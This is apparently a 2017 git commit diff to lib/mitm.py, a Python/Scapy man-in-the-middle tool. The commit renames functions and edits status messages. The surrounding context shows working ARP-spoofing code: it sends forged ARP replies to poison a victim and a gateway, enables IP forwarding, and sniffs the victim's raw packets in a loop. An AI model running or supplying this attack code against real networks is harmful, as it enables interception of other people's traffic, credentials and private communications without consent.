4ac7a16e2a50b01abf024c20bf5de75fe2830c47
reXez <28502942+ReXerzer@users.noreply.github.com>
2017-07-23 22:17:17 +0200

    Update mitm.py

--- lib/mitm.py
+++ lib/mitm.py
@@ -9,7 +9,7 @@ def mac(IP):
     for s, r in ans:
         return r[Ether].src
 
-def spoof(victimIP, gateway, victimMac, gatewayMac):
+def spoofer(victimIP, gateway, victimMac, gatewayMac):
     arppkt1 = ARP(op=2, psrc=gateway, pdst=victimIP, hwdst=victimMac)
     arppkt2 = ARP(op=2, psrc=victimIP, pdst=gateway, hwdst=gatewayMac)
     send(arppkt1, verbose=0)
@@ -22,7 +22,7 @@ def portforward():
 def restore(victimIP, gateway, victimMac, gatewayMac):
     svictim = ARP(op=2, pdst=gateway, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac)
     sgateway = ARP(op=2, pdst=victimIP, psrc=gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMac)
-    print("[{0}+{2}][{0}INFO{2}] {1}Restoring targets{2}".format(LGREEN, RD, RST))
+    print("[{0}+{2}][{0}INFO{2}] {1}Restoring target{2}".format(LGREEN, RD, RST))
     send(svictim, count=5, verbose=0)
     send(sgateway, count=5, verbose=0)
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
@@ -34,12 +34,12 @@ def sniffer(victimIP, gateway):
     data = sniff(filter="host " + str(victimIP) + " or " + str(gateway), prn=lambda x:x.sprintf("[+] %Raw.load% "), count=1)
     print(RST)
 
-def attack(tgtIP, gateIP):
+def arpattack(tgtIP, gateIP):
     portforward()
     victimMac = mac(tgtIP)
     if victimMac == None:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print("[{0}-{2}][{3}INFO{2}] {1}Couldn't get Victim's MAC address{2}".format(LRED, RD, RST, LGREEN))
+        print("[{0}-{2}][{3}INFO{2}] {1}Couldn't get Victim's MAC address\n{2}[{4}*{2}] {1}Host not up, try again later.{2}".format(LRED, RD, RST, LGREEN, BLUE))
         print("[{0}*{2}][{1}INFO{2}] {3}Exiting...{2}".format(BLUE, LGREEN, RST, RD))
         sys.exit(1)
     else:
@@ -54,12 +54,11 @@ def attack(tgtIP, gateIP):
     else:
         print("[{0}+{2}][{0}INFO{2}] {3}Gateway's MAC address found:{2} {4}{1}{2}".format(LGREEN, gatewayMac, RST, RD, GR))
     
-    print("[{0}+{2}][{0}INFO{2}] {1}Poisoning targets...{2}".format(LGREEN, RD, RST))
+    print("[{0}+{2}][{0}INFO{2}] {1}Poisoning target...{2}".format(LGREEN, RD, RST))
     while True:
         try:
-            spoof(tgtIP, gateIP, victimMac, gatewayMac)
+            spoofer(tgtIP, gateIP, victimMac, gatewayMac)
             time.sleep(1.5)
             sniffer(tgtIP, gateIP)
         except KeyboardInterrupt:
             restore(tgtIP, gateIP, victimMac, gatewayMac)
-
